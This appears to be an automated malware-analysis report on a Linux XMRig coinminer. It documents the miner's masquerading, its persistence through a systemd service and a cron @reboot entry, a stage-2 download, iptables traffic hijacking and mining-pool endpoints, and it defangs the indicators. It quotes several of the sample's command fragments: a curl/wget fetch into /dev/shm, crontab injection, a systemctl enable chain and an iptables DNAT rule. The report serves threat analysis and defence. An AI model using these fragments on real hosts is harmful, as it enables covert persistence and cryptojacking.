> **Verdict: malicious** · Family **XMRig** (suspected) · Confidence **high**
> 
> Aliases: XMRig 6.26.0 Linux coinminer, sad[.]lat oracle-service miner
> 
> The sample is a statically linked XMRig 6.26.0 miner with custom downloader/persistence logic: it masquerades as system processes such as irqbalance, cron and systemd-journald, creates the oracle-service service and a crontab @reboot autostart entry, pulls a second stage from download[.]xrpl[.]city, and connects to hardcoded mining pools. The conclusion is supported by decompilation, string/pointer tables and real runtime observations (process-name rewriting, mutex locks, mining-pool connection attempts, crontab invocation failure).

## Behavior analysis

**10** behaviors in total, each with attached evidence; **6** are obtainable statically and **4** were obtained through dynamic analysis.

### 1. Masquerade as system processes

`T1036.005` · Confidence **high** · Dynamic

After starting, it picks one of 9 system process names by pid%9, calls prctl(PR_SET_NAME) and overwrites argv[0] with that name, so the process list shows normal services such as irqbalance, systemd-logind, dbus-daemon and cron.

> **Evidence**: FUN_005809b0 @0x5809b0: 0x5809f6 call prctl(PR_SET_NAME=15, name table[pid%9]); 0x580a31 strcpy(argv[0]); dynamic breakpoint measured rdi=15, rsi="/usr/sbin/cron -f"
> 
> **Source**: `ev-000022` · `ev-000023` · `ev-000024`

### 2. Create a systemd service

`T1543.002` · Confidence **high** · Static

When it resides at /etc/.dev/oracle-monitor, it writes /etc/systemd/system/oracle-service.service (Description=System Telemetry, ExecStart=/etc/.dev/oracle-monitor, Restart=always) and runs systemctl daemon-reload/enable/start to stay resident across reboots.

> **Evidence**: 0x41394c references /etc/systemd/system/oracle-service.service; from 0x41396f it concatenates [Unit]/[Service]; 0x4139a9 system("systemctl daemon-reload && systemctl enable oracle-service && systemctl start oracle-service")
> 
> **Source**: `ev-000010` · `ev-000024`

### 3. Install cron boot autostart

`T1053.003` · Confidence **high** · Dynamic

It copies the downloaded payload to /var/tmp/.sys_cache_<pid%100> and chmod +x, first deletes old files with the same prefix, then writes an @reboot entry via crontab so it runs after reboot.

> **Evidence**: 0x4137fd snprintf "/var/tmp/.sys_cache_%d"; 0x41380d system("rm -f /var/tmp/.sys_cache_*"); 0x4139d6 system("(crontab -l ... echo '@reboot %s') | crontab -"); dynamic stderr: /var/spool/cron/: mkstemp: Permission denied
> 
> **Source**: `ev-000010` · `ev-000016` · `ev-000024`

### 4. Download stage-2 payload

`T1105` · Confidence **high** · Static

If /dev/shm/.sys_cache_backup does not exist, it uses curl -k -s -L or wget to download a file from hxxp://download[.]xrpl[.]city/vl into that path, as the payload for later dropping and reboot execution.

> **Evidence**: 0x4138af loads PTR_s_http___download_xrpl_city_vl; 0x413898/0x4138bf build the curl/wget command; target path /dev/shm/.sys_cache_backup
> 
> **Source**: `ev-000010` · `ev-000024`

### 5. Single-instance mutex lock

`T1480` · Confidence **high** · Dynamic

It opens /dev/shm/.agt.lck and /dev/shm/.mnr.lck and applies F_WRLCK file locks to prevent duplicate instances; then forks to run in the background.

> **Evidence**: 0x4136ef/0x413768 open+flock .agt.lck/.mnr.lck; dynamic syscall trace: open("/dev/shm/.agt.lck", O_RDWR|O_CREAT)=3, fcntl(F_SETLK, F_WRLCK)=0, fork=193
> 
> **Source**: `ev-000017` · `ev-000018` · `ev-000010`

### 6. Tamper with iptables traffic

`T1562.004` · Confidence **high** · Static

When running as root, it loops DNAT over outbound 80/TCP traffic to 192.168.x.x, redirecting it to the hardcoded mining pool's port 443 and hijacking local HTTP traffic.

> **Evidence**: FUN_00580a50 @0x580a50 iterates the 0xa69c80 mining-pool pointer table; 0x580b70 formats iptables -t nat -A OUTPUT -d %s -p tcp --dport 80 -j DNAT --to-destination %s; the source address is generated by FUN_00580720 as 192.168.%d.%d
> 
> **Source**: `ev-000013` · `ev-000014` · `ev-000024`

### 7. Built-in XMRig mining engine

`T1496` · Confidence **high** · Static

It statically links XMRig 6.26.0, with RandomX and other algorithms, CPU/OpenCL/CUDA backends and the mining.subscribe/authorize/submit protocol, mining directly with local compute.

> **Evidence**: strings "XMRig 6.26.0" @off 4924286, randomx-*, mining.subscribe; AES S-box @0x522bc0 and SHA-256 constants @0x4d3980 match XMRig/RandomX
> 
> **Source**: `ev-000024` · `ev-000005` · `ev-000007`

### 8. Mining-pool outbound addresses

`T1496` · Confidence **high** · Dynamic

It connects to vl[.]sad[.]lat:443, 166.88.7[.]157:443 and 172.245.81[.]188:443 in order per the built-in pool table; within the dynamic window the connection to 166.88.7[.]157:443 returned ENETUNREACH due to network isolation.

> **Evidence**: 0xa69c80 pointer table has 6 entries (3 unique endpoints); dynamic socket(AF_INET, SOCK_STREAM)+connect(166.88.7[.]157:443)=-1 ENETUNREACH
> 
> **Source**: `ev-000016` · `ev-000013` · `ev-000024`

### 9. Self-copy into hidden directories

`T1036.005` · Confidence **high** · Static

It uses cp -f /proc/self/exe to copy itself to /etc/.dev/oracle-monitor and /dev/shm/.sys_cache_backup, and chmod +x to keep them executable.

> **Evidence**: FUN_005808a0 @0x5808a0 executes cp -f %s %s && chmod +x %s; 0x4136d8/0x413929 reference /etc/.dev/oracle-monitor; 0x41391d system("mkdir -p /etc/.dev")
> 
> **Source**: `ev-000021` · `ev-000010` · `ev-000024`

### 10. Probe host and power state

`T1082` · Confidence **medium** · Static

It reads /sys/firmware/dmi/tables/smbios_entry_point, DMI memory-slot information and /sys/class/power_supply/BAT%d/status, for hardware fingerprinting and adjusting mining on battery power.

> **Evidence**: strings /sys/firmware/dmi/tables/smbios_entry_point @off 5040776, /sys/class/power_supply/BAT%d/status; DIMM_{}{} parse format string @off 4935852
> 
> **Source**: `ev-000001` · `ev-000024`

## Do not misjudge

:::important
The following conclusions are **easy to misjudge**; please note when citing this report.

- Do not judge it as ransomware or an infostealer based on the built-in AES/SHA-256 constants—these constants come from the XMRig/RandomX and TLS implementations.
- Do not claim a real C2 session was established or mining succeeded—the dynamic window contains only connection attempts and ENETUNREACH, with no requests/responses.
- Do not assert the sample has worm-like self-propagation—no scanning, weak-password brute force or lateral-movement code was seen.
- Do not treat /etc/.dev and oracle-service as official Oracle components—this is attacker-created persistence naming.
:::

## Analysis method and limitations

**Limitations and pending verification**

1. The dynamic environment's network was isolated and neither the mining pool nor the download site responded for real; all C2 was recovered statically only, no session was observed, hence marked pending_dynamic_verify.
2. The stage-2 file referenced by hxxp://download[.]xrpl[.]city/vl was not obtained; its content and hash are unknown.
3. The sample ran as a non-root user, so the actual writing of iptables rules and the systemd service file was not observed and is confirmed only by decompilation and strings.
4. The sample is statically linked and stripped, function boundaries were inferred by the decompiler, and some helper-function names may be inaccurate.
5. The hardcoded mining username "smart" was inferred from the argv-building code; its account/wallet ownership was not verified on the mining-pool side.
